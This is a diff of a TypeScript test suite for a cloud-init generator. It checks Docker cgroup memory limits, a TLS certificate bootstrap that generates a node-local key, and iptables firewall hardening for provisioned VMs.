+      expect(unitFile.content).toContain('Slice=sam-infra.slice');
+      expect(unitFile.content).toContain('OOMScoreAdjust=-900');
+      expect(unitFile.content).toContain('Environment=HEARTBEAT_DOCKER_STATS_TIMEOUT=1500ms');
+      expect(unitFile.content).toContain(
+        'Environment=HEARTBEAT_WORKSPACE_METRICS_MAX_CONTAINERS=4'
+      );
+      expect(unitFile.content).toContain(
+        'Environment=HEARTBEAT_WORKSPACE_METRICS_MAX_OUTPUT_BYTES=32768'
+      );
+      expect(sliceFile.content).toContain('MemoryMin=256M');
+      expect(infraSliceFile.content).toContain('MemoryMin=256M');
+      expect(workloadSliceFile.content).toContain('MemoryAccounting=yes');
+      expect(workloadSliceFile.content).not.toContain('MemoryMin=');
+      expect(headroomScript.permissions).toBe('0755');
+      expect(headroomScript.content).toContain('RESERVE_MB="512"');
+      expect(headroomScript.content).toContain('MIN_DOCKER_MB="768"');
+      expect(headroomScript.content).toContain('sam-workload.slice.d/50-headroom.conf');
+      expect(headroomScript.content).toContain('MemoryMax=${DOCKER_MEMORY_MAX_MB}M');
+      expect(headroomScript.content).not.toContain('docker.service.d/sam-headroom.conf');
+      expect(verifyScript.permissions).toBe('0755');
+      expect(verifyScript.content).toContain('docker inspect -f');
+      expect(verifyScript.content).toContain('sam-workload.slice');
+      expect(verifyScript.content).not.toContain('EffectiveMemoryMin');
+      expect(dockerDaemon.content).toContain('"cgroup-parent": "sam-workload.slice"');
+
+      const runcmd = parsed.runcmd as string[];
+      const headroomCommand = runcmd.find((entry) =>
+        entry.includes('/usr/local/sbin/sam-configure-docker-memory.sh')
+      );
+      expect(headroomCommand).toBe('/usr/local/sbin/sam-configure-docker-memory.sh || exit $?');
+      expect(runcmd.indexOf(headroomCommand ?? '')).toBeLessThan(
+        runcmd.findIndex((entry) => entry.includes('systemctl start vm-agent'))
+      );
+    });
+
+    it('defaults to a nonzero VM agent host memory reserve for new nodes', () => {
+      const config = generateCloudInit(baseVariables());
+      const parsed = YAML.parse(config.replace(/^#cloud-config\n/, ''));
+      const headroomScript = parsed.write_files.find(
+        (f: { path: string }) => f.path === '/usr/local/sbin/sam-configure-docker-memory.sh'
+      );
+
+      expect(headroomScript.content).toContain('RESERVE_MB="512"');
+      expect(headroomScript.content).toContain('sam-workload.slice.d/50-headroom.conf');
+    });
+
+    it('configure script writes a bounded workload MemoryMax and restarts active Docker', () => {
+      const { calls, conf, result } = runConfigureDockerMemoryScript({
+        dockerActive: true,
+        minMb: '512',
+        reserveMb: '512',
+        totalMb: 2048,
+      });
+
+      expect(result.status).toBe(0);
+      expect(result.stderr).toBe('');
+      expect(conf).toContain('MemoryAccounting=yes');
+      expect(conf).toContain('MemoryMax=1536M');
+      expect(calls).toContain('systemctl daemon-reload');
+      expect(calls).toContain('systemctl restart docker');
+    });
+
+    it('configure script fails closed when enabled reserve leaves Docker below minimum', () => {
+      const { calls, conf, result } = runConfigureDockerMemoryScript({
+        minMb: '512',
+        reserveMb: '512',
+        totalMb: 1023,
+      });
+
+      expect(result.status).toBe(78);
+      expect(result.stderr).toContain('refusing to run without SAM workload MemoryMax');
+      expect(result.stderr).toContain('below minimum 512M');
+      expect(conf).toBeUndefined();
+      expect(calls).not.toContain('systemctl daemon-reload');
+      expect(calls).not.toContain('systemctl restart docker');
+    });
+
+    it('rendered bootstrap stops before vm-agent start when headroom admission fails', () => {
+      const { calls, result, shellifiedRuncmd } = runRenderedBootstrapRuncmd({
+        minMb: '512',
+        reserveMb: '512',
+        totalMb: 1023,
+      });
+
+      expect(shellifiedRuncmd).toContain('#!/bin/sh\n');
+      expect(shellifiedRuncmd).toContain('sam-configure-docker-memory.sh');
+      expect(shellifiedRuncmd).toContain('|| exit $?');
+      expect(result.status).toBe(78);
+      expect(result.stderr).toContain('refusing to run without SAM workload MemoryMax');
+      expect(calls).not.toContain('logger -t sam-boot PHASE START: vm-agent-start');
+      expect(calls).not.toContain('systemctl enable vm-agent');
+      expect(calls).not.toContain('systemctl start vm-agent');
+      expect(calls).not.toContain('logger -t sam-boot ALL PHASES COMPLETE');
+    });
+
+    it('configure script preserves explicit zero reserve as disabled mode', () => {
+      const { calls, conf, result } = runConfigureDockerMemoryScript({
+        minMb: '512',
+        reserveMb: '0',
+        totalMb: 1023,
+      });
+
+      expect(result.status).toBe(0);
+      expect(result.stderr).toBe('');
+      expect(conf).toBeUndefined();
+      expect(calls).toContain('systemctl daemon-reload');
+      expect(calls).toContain('logger -t sam-headroom SAM workload MemoryMax reserve disabled');
+      expect(calls).not.toContain('systemctl restart docker');
+    });
+
+    it('rendered bootstrap still starts vm-agent when zero reserve disables admission', () => {
+      const { calls, result } = runRenderedBootstrapRuncmd({
+        minMb: '512',
+        reserveMb: '0',
+        totalMb: 1023,
+      });
+
+      expect(result.status).toBe(0);
+      expect(result.stderr).toBe('');
+      expect(calls).toContain('logger -t sam-headroom SAM workload MemoryMax reserve disabled');
+      expect(calls).toContain('logger -t sam-boot PHASE START: vm-agent-start');
+      expect(calls).toContain('systemctl enable vm-agent');
+      expect(calls).toContain('systemctl start vm-agent');
+      expect(calls).toContain('logger -t sam-boot ALL PHASES COMPLETE');
+    });
+
+    it('configure script propagates systemctl failures', () => {
+      const { result } = runConfigureDockerMemoryScript({
+        minMb: '512',
+        reserveMb: '512',
+        systemctlFails: true,
+        totalMb: 2048,
+      });
+
+      expect(result.status).not.toBe(0);
+      expect(result.stderr).toContain('systemctl failed');
+    });
   });
 
-  describe('TLS certificate injection', () => {
-    it('sets VM_AGENT_PORT=8443 and TLS paths when cert provided', () => {
-      const config = generateCloudInit(baseVariables({
-        originCaCert: REALISTIC_CERT,
-        originCaKey: REALISTIC_KEY,
-      }));
+  describe('workload cgroup verification script', () => {
+    it('accepts expected SAM ancestry for devcontainer, compose and build cgroup paths', () => {
+      for (const cgroupPath of [
+        '/sam.slice/sam-workload.slice/docker-abc.scope',
+        '/sam.slice/sam-workload.slice/docker-compose.slice/docker-abc.scope',
+        '/sam.slice/sam-workload.slice/buildkit-build.slice/docker-build.scope',
+      ]) {
+        const { result } = runVerifyWorkloadCgroupScript({ cgroupPath });
+
+        expect(result.status, `${cgroupPath}\n${result.stderr}`).toBe(0);
+        expect(result.stdout).toContain(cgroupPath);
+        expect(result.stdout).toContain('MemoryMax=1610612736');
+        expect(result.stdout).toContain('MemoryMin=268435456');
+      }
+    });
+
+    it('still verifies CPU weights when the memory reserve is disabled', () => {
+      // The CPU assertions sit BEFORE the memory-reserve early return on purpose.
+      // If they sat after it, setting the reserve to 0 would silently disable
+      // them too — a guard whose falsifying case is unreachable in one supported
+      // configuration (.claude/rules/69).
+      const { result } = runVerifyWorkloadCgroupScript({
+        infraCpuWeight: '50',
+        infraMemoryMin: '0',
+        memoryMax: 'max',
+        reserveMb: '0',
+        samMemoryMin: '0',
+        workloadCpuWeight: '100',
+        workloadEffectiveMemoryMax: 'infinity',
+        workloadMemoryMax: 'infinity',
+      });
+
+      expect(result.status).not.toBe(0);
+      expect(result.stderr).toContain('sam-infra.slice cgroup cpu.weight expected 1000, got 50');
+    });
+
+    it('refuses a boot where the agent slice does not outrank the workload slice', () => {
+      // Equal weights load fine as systemd units, so nothing else would notice:
+      // the agent would simply compete on equal footing again, which is the
+      // condition this change exists to remove.
+      const { result } = runVerifyWorkloadCgroupScript({
+        configuredInfraCpuWeight: '100',
+        configuredWorkloadCpuWeight: '100',
+        infraCpuWeight: '100',
+        workloadCpuWeight: '100',
+      });
+
+      expect(result.status).not.toBe(0);
+      expect(result.stderr).toContain('does not outrank workload');
+    });
+
+    it('refuses a boot where the agent slice has no CPU weight at all', () => {
+      const { result } = runVerifyWorkloadCgroupScript({ infraCpuWeight: null });
+
+      expect(result.status).not.toBe(0);
+      expect(result.stderr).toContain('missing cgroup cpu.weight');
+    });
+
+    it('acknowledges explicit disabled mode without claiming memory protection', () => {
+      const { result } = runVerifyWorkloadCgroupScript({
+        infraMemoryMin: '0',
+        memoryMax: 'max',
+        reserveMb: '0',
+        samMemoryMin: '0',
+        workloadEffectiveMemoryMax: 'infinity',
+        workloadMemoryMax: 'infinity',
+      });
+
+      expect(result.status).toBe(0);
+      expect(result.stdout).toContain(
+        'SAM workload MemoryMax reserve disabled; verified cgroup ancestry and CPU weights only'
+      );
+    });
+
+    it('rejects unsafe or unproven cgroup states', () => {
+      const cases: Array<{
+        name: string;
+        options: Parameters<typeof runVerifyWorkloadCgroupScript>[0];
+        stderr: string;
+      }> = [
+        {
+          name: 'missing cgroup v2 entry',
+          options: { procCgroupContent: '1:name=systemd:/sam.slice/sam-workload.slice\n' },
+          stderr: 'has no cgroup v2 entry',
+        },
+        {
+          name: 'wrong ancestor',
+          options: { cgroupPath: '/system.slice/docker-abc.scope' },
+          stderr: 'outside sam.slice',
+        },
+        {
+          name: 'missing workload cap',
+          options: { memoryMax: null },
+          stderr: 'missing cgroup memory.max',
+        },
+        {
+          name: 'infinite workload cap',
+          options: { memoryMax: 'max' },
+          stderr: 'sam-workload.slice cgroup memory.max expected',
+        },
+        {
+          name: 'wrong workload cap',
+          options: { memoryMax: '1073741824' },
+          stderr: 'sam-workload.slice cgroup memory.max expected 1610612736 bytes',
+        },
+        {
+          name: 'infinite workload systemd cap',
+          options: { workloadMemoryMax: 'infinity' },
+          stderr: 'sam-workload.slice MemoryMax expected',
+        },
+        {
+          name: 'wrong effective workload systemd cap',
+          options: { workloadEffectiveMemoryMax: '1073741824' },
+          stderr: 'sam-workload.slice EffectiveMemoryMax expected 1610612736 bytes',
+        },
+        {
+          name: 'zero parent minimum',
+          options: { samMemoryMin: '0' },
+          stderr: 'sam.slice cgroup memory.min expected at least 268435456 bytes',
+        },
+        {
+          name: 'zero infra minimum',
+          options: { infraMemoryMin: '0' },
+          stderr: 'sam-infra.slice cgroup memory.min expected at least 268435456 bytes',
+        },
+        {
+          name: 'small host',
+          options: { totalMb: 1023 },
+          stderr: 'SAM workload MemoryMax is not enforceable',
+        },
+        {
+          name: 'docker inspect failure',
+          options: { dockerFails: true },
+          stderr: 'docker inspect failed',
+        },
+        {
+          name: 'systemctl failure',
+          options: { systemctlFails: true },
+          stderr: 'systemctl show failed',
+        },
+      ];
+
+      for (const testCase of cases) {
+        const { result } = runVerifyWorkloadCgroupScript(testCase.options);
+
+        expect(result.status, testCase.name).not.toBe(0);
+        expect(result.stderr, testCase.name).toContain(testCase.stderr);
+      }
+    });
+  });
+
+  describe('TLS certificate bootstrap', () => {
+    it('sets VM_AGENT_PORT=8443 and TLS paths when certificate URL provided', () => {
+      const config = generateCloudInit(
+        baseVariables({
+          originCaCertificateUrl: ORIGIN_CA_CERTIFICATE_URL,
+        })
+      );
 
       expect(config).toContain('Environment=VM_AGENT_PORT=8443');
       expect(config).toContain('Environment=TLS_CERT_PATH=/etc/sam/tls/origin-ca.pem');
       expect(config).toContain('Environment=TLS_KEY_PATH=/etc/sam/tls/origin-ca-key.pem');
     });
 
-    it('sets VM_AGENT_PORT=8080 and empty TLS paths when no cert', () => {
+    it('sets VM_AGENT_PORT=8080 and empty TLS paths when no certificate URL', () => {
       const config = generateCloudInit(baseVariables());
 
       expect(config).toContain('Environment=VM_AGENT_PORT=8080');
@@ -263,69 +1153,97 @@ describe('generateCloudInit', () => {
       expect(config).toContain('Environment=TLS_KEY_PATH=');
     });
 
-    it('key file has restricted permissions (0600)', () => {
-      const config = generateCloudInit(baseVariables({
-        originCaCert: REALISTIC_CERT,
-        originCaKey: REALISTIC_KEY,
-      }));
-
-      expect(config).toMatch(/origin-ca-key\.pem[\s\S]*?permissions:\s*'0600'/);
-    });
-
-    /**
-     * CRITICAL REGRESSION TEST: Parse the YAML output and verify full PEM content survives.
-     *
-     * This test would have caught the bug introduced in PR #320, where plain string
-     * replacement of multi-line PEM content broke YAML block scalar indentation,
-     * truncating certs to just the first line.
-     *
-     * See: docs/notes/2026-03-12-tls-yaml-indentation-postmortem.md
-     */
-    it('full multi-line cert PEM survives YAML generation intact', () => {
-      const config = generateCloudInit(baseVariables({
-        originCaCert: REALISTIC_CERT,
-        originCaKey: REALISTIC_KEY,
-      }));
-
-      // Parse the generated YAML — this is the critical test.
-      // If indentation is wrong, YAML.parse() will either throw or
-      // produce truncated content.
-      const parsed = YAML.parse(config);
-
-      const certEntry = parsed.write_files.find(
-        (f: { path: string }) => f.path === '/etc/sam/tls/origin-ca.pem'
+    it('generates node-local key with restricted permissions before starting vm-agent', () => {
+      const config = generateCloudInit(
+        baseVariables({
+          originCaCertificateUrl: ORIGIN_CA_CERTIFICATE_URL,
+        })
       );
-      expect(certEntry).toBeDefined();
-
-      const parsedCert = certEntry.content.trim();
-      expect(parsedCert).toBe(REALISTIC_CERT);
-    });
-
-    it('full multi-line key PEM survives YAML generation intact', () => {
-      const config = generateCloudInit(baseVariables({
-        originCaCert: REALISTIC_CERT,
-        originCaKey: REALISTIC_KEY,
-      }));
-
       const parsed = YAML.parse(config);
 
+      const originCaBlock = parsed.runcmd.find(
+        (entry: string) => typeof entry === 'string' && entry.includes('ORIGIN_CA_CERTIFICATE_URL=')
+      );
+      expect(originCaBlock).toContain(`ORIGIN_CA_CERTIFICATE_URL="${ORIGIN_CA_CERTIFICATE_URL}"`);
+      expect(originCaBlock).toContain('openssl genrsa -out "$TLS_KEY_PATH" 2048');
+      expect(originCaBlock).toContain('chmod 600 "$TLS_KEY_PATH"');
+      expect(originCaBlock).toContain('openssl req -new -key "$TLS_KEY_PATH"');
+      expect(originCaBlock).toContain('Authorization: Bearer cb-token-abc');
+      expect(originCaBlock).toContain('--data-binary "@$TLS_CSR_PATH"');
+      expect(parsed.runcmd.indexOf(originCaBlock)).toBeLessThan(
+        parsed.runcmd.findIndex(
+          (entry: string) => typeof entry === 'string' && entry.includes('systemctl start vm-agent')
+        )
+      );
+    });
+
+    it('fails closed instead of rewriting vm-agent to plaintext when Origin CA bootstrap fails', () => {
+      const config = generateCloudInit(
+        baseVariables({
+          originCaCertificateUrl: ORIGIN_CA_CERTIFICATE_URL,
+        })
+      );
+      const parsed = YAML.parse(config);
+
+      const originCaBlock = parsed.runcmd.find(
+        (entry: string) => typeof entry === 'string' && entry.includes('ORIGIN_CA_CERTIFICATE_URL=')
+      );
+      expect(originCaBlock).toContain('refusing to start vm-agent without TLS');
+      expect(originCaBlock).toContain('rm -f "$TLS_CERT_PATH" "$TLS_KEY_PATH" "$TLS_CSR_PATH"');
+      expect(originCaBlock).toContain('exit 1');
+      expect(originCaBlock).not.toContain('falling back to plaintext mode');
+      expect(originCaBlock).not.toContain("sed -i '/^Environment=TLS_CERT_PATH=/d'");
+      expect(originCaBlock).not.toContain("sed -i '/^Environment=TLS_KEY_PATH=/d'");
+      expect(originCaBlock).not.toContain('Environment=VM_AGENT_PORT=8080');
+    });
+
+    it('does not embed static Origin CA cert or private key files in parsed user-data', () => {
+      const config = generateCloudInit(
+        baseVariables({
+          originCaCertificateUrl: ORIGIN_CA_CERTIFICATE_URL,
+        })
+      );
+      const parsed = YAML.parse(config);
+      const paths = parsed.write_files.map((f: { path: string }) => f.path);
+      expect(paths).not.toContain('/etc/sam/tls/origin-ca.pem');
+      expect(paths).not.toContain('/etc/sam/tls/origin-ca-key.pem');
       const keyEntry = parsed.write_files.find(
         (f: { path: string }) => f.path === '/etc/sam/tls/origin-ca-key.pem'
       );
-      expect(keyEntry).toBeDefined();
-
-      const parsedKey = keyEntry.content.trim();
-      expect(parsedKey).toBe(REALISTIC_KEY);
+      expect(keyEntry).toBeUndefined();
+      // Assert on parsed values, never JSON.stringify(parsed): stringify escapes
+      // real newlines as the two characters "\n", so a multiline PEM literal can
+      // never match there and the assertion would pass even when the block IS
+      // embedded in the generated document.
+      const writeFileContents = (parsed.write_files as CloudInitWriteFile[]).map(
+        (file) => file.content ?? ''
+      );
+      const runcmdEntries = ((parsed.runcmd ?? []) as unknown[]).filter(
+        (entry): entry is string => typeof entry === 'string'
+      );
+      for (const content of [...writeFileContents, ...runcmdEntries]) {
+        expect(content).not.toContain(REALISTIC_PEM_BLOCK);
+        expect(content).not.toContain(REALISTIC_CERT);
+        expect(content).not.toContain('-----BEGIN CERTIFICATE-----');
+        expect(content).not.toContain('PRIVATE KEY-----');
+      }
+      // Liveness for the absence assertions above (rule 62): they must not be
+      // satisfied by an empty or unwired document. The TLS bootstrap is still
+      // wired to the runtime-fetched certificate path.
+      expect(
+        writeFileContents.some((content) => content.includes('/etc/sam/tls/origin-ca.pem'))
+      ).toBe(true);
     });
 
-    it('generated YAML is valid and parseable with realistic certs', () => {
-      const config = generateCloudInit(baseVariables({
-        originCaCert: REALISTIC_CERT,
-        originCaKey: REALISTIC_KEY,
-        projectId: 'proj-123',
-        chatSessionId: 'sess-456',
-        taskId: 'task-789',
-      }));
+    it('generated YAML is valid and parseable with certificate bootstrap', () => {
+      const config = generateCloudInit(
+        baseVariables({
+          originCaCertificateUrl: ORIGIN_CA_CERTIFICATE_URL,
+          projectId: 'proj-123',
+          chatSessionId: 'sess-456',
+          taskId: 'task-789',
+        })
+      );
 
       const parsed = YAML.parse(config);
       expect(parsed.hostname).toBe('sam-test-node');
@@ -333,22 +1251,24 @@ describe('generateCloudInit', () => {
       expect(parsed.write_files.length).toBeGreaterThanOrEqual(5);
     });
 
-    it('config with realistic TLS certs stays within 32KB limit', () => {
-      const config = generateCloudInit(baseVariables({
-        originCaCert: REALISTIC_CERT,
-        originCaKey: REALISTIC_KEY,
-        projectId: 'proj-123',
-        chatSessionId: 'sess-456',
-      }));
+    it('config with TLS bootstrap stays within 32KB limit', () => {
+      const config = generateCloudInit(
+        baseVariables({
+          originCaCertificateUrl: ORIGIN_CA_CERTIFICATE_URL,
+          projectId: 'proj-123',
+          chatSessionId: 'sess-456',
+        })
+      );
 
       expect(validateCloudInitSize(config)).toBe(true);
     });
 
-    it('handles empty cert/key gracefully (no TLS mode)', () => {
-      const config = generateCloudInit(baseVariables({
-        originCaCert: '',
-        originCaKey: '',
-      }));
+    it('handles empty certificate URL gracefully (no TLS mode)', () => {
+      const config = generateCloudInit(
+        baseVariables({
+          originCaCertificateUrl: '',
+        })
+      );
 
       const parsed = YAML.parse(config);
       expect(parsed.write_files).toBeDefined();
@@ -358,12 +1278,7 @@ describe('generateCloudInit', () => {
 
   describe('OS-level firewall configuration', () => {
     it('includes firewall setup script in write_files', () => {
-      const config = generateCloudInit(baseVariables());
-      const parsed = YAML.parse(config);
-
-      const firewallScript = parsed.write_files.find(
-        (f: { path: string }) => f.path === '/etc/sam/firewall/setup-firewall.sh'
-      );
+      const firewallScript = getFirewallScript();
       expect(firewallScript).toBeDefined();
       expect(firewallScript.permissions).toBe('0755');
       expect(firewallScript.content).toContain('#!/bin/bash');
@@ -376,53 +1291,36 @@ describe('generateCloudInit', () => {
     });
 
     it('firewall script contains correct VM agent port (TLS mode)', () => {
-      const config = generateCloudInit(baseVariables({
-        originCaCert: REALISTIC_CERT,
-        originCaKey: REALISTIC_KEY,
-      }));
-      const parsed = YAML.parse(config);
-
-      const firewallScript = parsed.write_files.find(
-        (f: { path: string }) => f.path === '/etc/sam/firewall/setup-firewall.sh'
-      );
+      const firewallScript = getFirewallScript({
+        originCaCertificateUrl: ORIGIN_CA_CERTIFICATE_URL,
+      });
       expect(firewallScript.content).toContain('VM_AGENT_PORT="8443"');
     });
 
     it('firewall script contains correct VM agent port (no TLS mode)', () => {
-      const config = generateCloudInit(baseVariables());
-      const parsed = YAML.parse(config);
-
-      const firewallScript = parsed.write_files.find(
-        (f: { path: string }) => f.path === '/etc/sam/firewall/setup-firewall.sh'
-      );
+      const firewallScript = getFirewallScript();
       expect(firewallScript.content).toContain('VM_AGENT_PORT="8080"');
     });
 
     it('firewall script allows loopback and Docker bridge traffic', () => {
-      const config = generateCloudInit(baseVariables());
-      const parsed = YAML.parse(config);
-
-      const firewallScript = parsed.write_files.find(
-        (f: { path: string }) => f.path === '/etc/sam/firewall/setup-firewall.sh'
-      );
+      const firewallScript = getFirewallScript();
       const content = firewallScript.content;
       // Trusted interfaces are INSERTed (-I) at position 1 so they take priority
       // over the port-level DROP rules.
       expect(content).toContain('iptables -I INPUT 1 -i lo -j ACCEPT');
-      expect(content).toContain('iptables -I INPUT 1 -i docker0 -p tcp --dport "$VM_AGENT_PORT" -j ACCEPT');
-      expect(content).toContain('iptables -I INPUT 1 -i br-+ -p tcp --dport "$VM_AGENT_PORT" -j ACCEPT');
+      expect(content).toContain(
+        'iptables -I INPUT 1 -i docker0 -p tcp --dport "$VM_AGENT_PORT" -j ACCEPT'
+      );
+      expect(content).toContain(
+        'iptables -I INPUT 1 -i br-+ -p tcp --dport "$VM_AGENT_PORT" -j ACCEPT'
+      );
       // No conntrack ESTABLISHED,RELATED dependency — policy ACCEPT means
       // outbound reply packets don't need a state entry to come back.
       expect(content).not.toContain('conntrack --ctstate ESTABLISHED,RELATED');
     });
 
     it('firewall script installs targeted DROP rules for VM_AGENT_PORT (TCP and UDP) and SSH', () => {
-      const config = generateCloudInit(baseVariables());
-      const parsed = YAML.parse(config);
-
-      const firewallScript = parsed.write_files.find(
-        (f: { path: string }) => f.path === '/etc/sam/firewall/setup-firewall.sh'
-      );
+      const firewallScript = getFirewallScript();
       const content: string = firewallScript.content;
       // TCP drop on agent port (primary rule)
       expect(content).toContain('iptables -A INPUT -p tcp --dport "$VM_AGENT_PORT" -j DROP');
@@ -437,12 +1335,7 @@ describe('generateCloudInit', () => {
     });
 
     it('firewall script installs DROP rules before ACCEPT inserts (race-window eliminated)', () => {
-      const config = generateCloudInit(baseVariables());
-      const parsed = YAML.parse(config);
-
-      const firewallScript = parsed.write_files.find(
-        (f: { path: string }) => f.path === '/etc/sam/firewall/setup-firewall.sh'
-      );
+      const firewallScript = getFirewallScript();
       const content: string = firewallScript.content;
       // After -F INPUT flush, the DROP on the agent port must appear before
       // any CF ACCEPT INSERTs. This closes the window where the port would
@@ -457,13 +1350,17 @@ describe('generateCloudInit', () => {
       expect(cfInsertIdx).toBeGreaterThan(dropIdx);
     });
 
-    it('firewall script fetches Cloudflare IPs with fallback defaults', () => {
-      const config = generateCloudInit(baseVariables());
-      const parsed = YAML.parse(config);
+    it('firewall script carries no OCI receiver port plumbing', () => {
+      const firewallScript = getFirewallScript();
+      const content: string = firewallScript.content;
 
-      const firewallScript = parsed.write_files.find(
-        (f: { path: string }) => f.path === '/etc/sam/firewall/setup-firewall.sh'
-      );
+      // The host-side build flow replaced the in-VM OCI receiver entirely, so no
+      // firewall rules or port variable for it should remain.
+      expect(content).not.toContain('OCI_RECEIVER_PORT');
+    });
+
+    it('firewall script fetches Cloudflare IPs with fallback defaults', () => {
+      const firewallScript = getFirewallScript();
       const content = firewallScript.content;
       // Dynamic fetch URLs
       expect(content).toContain('https://www.cloudflare.com/ips-v4');
@@ -477,14 +1374,11 @@ describe('generateCloudInit', () => {
     });
 
     it('firewall script persists rules across reboots', () => {
-      const config = generateCloudInit(baseVariables());
-      const parsed = YAML.parse(config);
-
-      const firewallScript = parsed.write_files.find(
-        (f: { path: string }) => f.path === '/etc/sam/firewall/setup-firewall.sh'
-      );
+      const firewallScript = getFirewallScript();
       expect(firewallScript.content).toContain('iptables-save > /etc/iptables/rules.v4');
-      expect(firewallScript.content).toContain('ip6tables-save > /etc/iptables/rules.v6 2>/dev/null || true');
+      expect(firewallScript.content).toContain(
+        'ip6tables-save > /etc/iptables/rules.v6 2>/dev/null || true'
+      );
     });
 
     it('writes valid placeholder iptables persistence files before firewall setup runs', () => {
@@ -528,12 +1422,7 @@ describe('generateCloudInit', () => {
     });
 
     it('firewall script does not allow SSH or unrestricted inbound access', () => {
-      const config = generateCloudInit(baseVariables());
-      const parsed = YAML.parse(config);
-
-      const firewallScript = parsed.write_files.find(
-        (f: { path: string }) => f.path === '/etc/sam/firewall/setup-firewall.sh'
-      );
+      const firewallScript = getFirewallScript();
       const content: string = firewallScript.content;
       // No unrestricted ACCEPT rules
       expect(content).not.toMatch(/iptables -A INPUT -j ACCEPT/);
@@ -549,18 +1438,17 @@ describe('generateCloudInit', () => {
     });
 
     it('IPv6 firewall rules mirror IPv4 structure', () => {
-      const config = generateCloudInit(baseVariables());
-      const parsed = YAML.parse(config);
-
-      const firewallScript = parsed.write_files.find(
-        (f: { path: string }) => f.path === '/etc/sam/firewall/setup-firewall.sh'
-      );
+      const firewallScript = getFirewallScript();
       const content: string = firewallScript.content;
       // Trusted-interface ACCEPTs are INSERTED at position 1 so they take
       // priority over the targeted DROP rules appended earlier.
       expect(content).toContain('ip6tables -I INPUT 1 -i lo -j ACCEPT');
-      expect(content).toContain('ip6tables -I INPUT 1 -i docker0 -p tcp --dport "$VM_AGENT_PORT" -j ACCEPT');
-      expect(content).toContain('ip6tables -I INPUT 1 -i br-+ -p tcp --dport "$VM_AGENT_PORT" -j ACCEPT');
+      expect(content).toContain(
+        'ip6tables -I INPUT 1 -i docker0 -p tcp --dport "$VM_AGENT_PORT" -j ACCEPT'
+      );
+      expect(content).toContain(
+        'ip6tables -I INPUT 1 -i br-+ -p tcp --dport "$VM_AGENT_PORT" -j ACCEPT'
+      );
       // Policy stays ACCEPT; targeted DROP on VM_AGENT_PORT does the restriction.
       expect(content).toContain('ip6tables -P INPUT ACCEPT');
       expect(content).toContain('ip6tables -A INPUT -p tcp --dport "$VM_AGENT_PORT" -j DROP');
@@ -568,12 +1456,7 @@ describe('generateCloudInit', () => {
     });
 
     it('firewall script uses set -euo pipefail and does NOT clamp policy to DROP on exit', () => {
-      const config = generateCloudInit(baseVariables());
-      const parsed = YAML.parse(config);
-
-      const firewallScript = parsed.write_files.find(
-        (f: { path: string }) => f.path === '/etc/sam/firewall/setup-firewall.sh'
-      );
+      const firewallScript = getFirewallScript();
       const content: string = firewallScript.content;
       expect(content).toContain('set -euo pipefail');
       // The previous implementation had `trap 'iptables -P INPUT DROP ...' EXIT`
@@ -586,13 +1469,14 @@ describe('generateCloudInit', () => {
     // NOTE: debconf preseed is now handled by vm-agent provision package.
 
     it('config with firewall stays within 32KB Hetzner limit', () => {
-      const config = generateCloudInit(baseVariables({
-        originCaCert: REALISTIC_CERT,
-        originCaKey: REALISTIC_KEY,
-        projectId: 'proj-123',
-        chatSessionId: 'sess-456',
-        taskId: 'task-789',
-      }));
+      const config = generateCloudInit(
+        baseVariables({
+          originCaCertificateUrl: ORIGIN_CA_CERTIFICATE_URL,
+          projectId: 'proj-123',
+          chatSessionId: 'sess-456',
+          taskId: 'task-789',
+        })
+      );
 
       expect(validateCloudInitSize(config)).toBe(true);
     });
@@ -663,12 +1547,7 @@ describe('generateCloudInit', () => {
 
   describe('IPv6 firewall module loading', () => {
     it('firewall script loads ip6_tables kernel module before ip6tables commands', () => {
-      const config = generateCloudInit(baseVariables());
-      const parsed = YAML.parse(config);
-
-      const firewallScript = parsed.write_files.find(
-        (f: { path: string }) => f.path === '/etc/sam/firewall/setup-firewall.sh'
-      );
+      const firewallScript = getFirewallScript();
       const content: string = firewallScript.content;
 
       // Must load the kernel module
@@ -683,12 +1562,7 @@ describe('generateCloudInit', () => {
     });
 
     it('firewall script gracefully skips IPv6 when kernel module is unavailable', () => {
-      const config = generateCloudInit(baseVariables());
-      const parsed = YAML.parse(config);
-
-      const firewallScript = parsed.write_files.find(
-        (f: { path: string }) => f.path === '/etc/sam/firewall/setup-firewall.sh'
-      );
+      const firewallScript = getFirewallScript();
       const content: string = firewallScript.content;
 
       // IPv6 block must be conditional
@@ -698,12 +1572,7 @@ describe('generateCloudInit', () => {
     });
 
     it('ip6tables DROP/ACCEPT rules are inside the modprobe conditional, not unconditional', () => {
-      const config = generateCloudInit(baseVariables());
-      const parsed = YAML.parse(config);
-
-      const firewallScript = parsed.write_files.find(
-        (f: { path: string }) => f.path === '/etc/sam/firewall/setup-firewall.sh'
-      );
+      const firewallScript = getFirewallScript();
       const content: string = firewallScript.content;
 
       // All ip6tables rules must appear between the 'if modprobe' guard and the 'else' branch
@@ -724,12 +1593,7 @@ describe('generateCloudInit', () => {
     });
 
     it('ip6tables-save handles missing IPv6 support gracefully', () => {
-      const config = generateCloudInit(baseVariables());
-      const parsed = YAML.parse(config);
-
-      const firewallScript = parsed.write_files.find(
-        (f: { path: string }) => f.path === '/etc/sam/firewall/setup-firewall.sh'
-      );
+      const firewallScript = getFirewallScript();
       const content: string = firewallScript.content;
 
       // ip6tables-save should have error suppression
@@ -769,7 +1633,9 @@ describe('generateCloudInit', () => {
       // Delete must come before insert for idempotency
       expect(deleteIdx).toBeLessThan(insertIdx);
       // Delete ignores error if rule doesn't exist yet
-      expect(content).toContain('iptables -D DOCKER-USER -d "$METADATA_IP" -j DROP 2>/dev/null || true');
+      expect(content).toContain(
+        'iptables -D DOCKER-USER -d "$METADATA_IP" -j DROP 2>/dev/null || true'
+      );
     });
 
     it('metadata block script uses METADATA_IP variable for the well-known endpoint', () => {
@@ -783,12 +1649,7 @@ describe('generateCloudInit', () => {
     });
 
     it('firewall script defers metadata blocking until Docker restart', () => {
-      const config = generateCloudInit(baseVariables());
-      const parsed = YAML.parse(config);
-
-      const firewallScript = parsed.write_files.find(
-        (f: { path: string }) => f.path === '/etc/sam/firewall/setup-firewall.sh'
-      );
+      const firewallScript = getFirewallScript();
       const content: string = firewallScript.content;
       expect(content).not.toContain('DOCKER_USER_WAIT');
       expect(content).not.toContain('/etc/sam/firewall/apply-metadata-block.sh');
@@ -796,12 +1657,7 @@ describe('generateCloudInit', () => {
     });
 
     it('firewall persistence happens without early metadata block warnings', () => {
-      const config = generateCloudInit(baseVariables());
-      const parsed = YAML.parse(config);
-
-      const firewallScript = parsed.write_files.find(
-        (f: { path: string }) => f.path === '/etc/sam/firewall/setup-firewall.sh'
-      );
+      const firewallScript = getFirewallScript();
       const content: string = firewallScript.content;
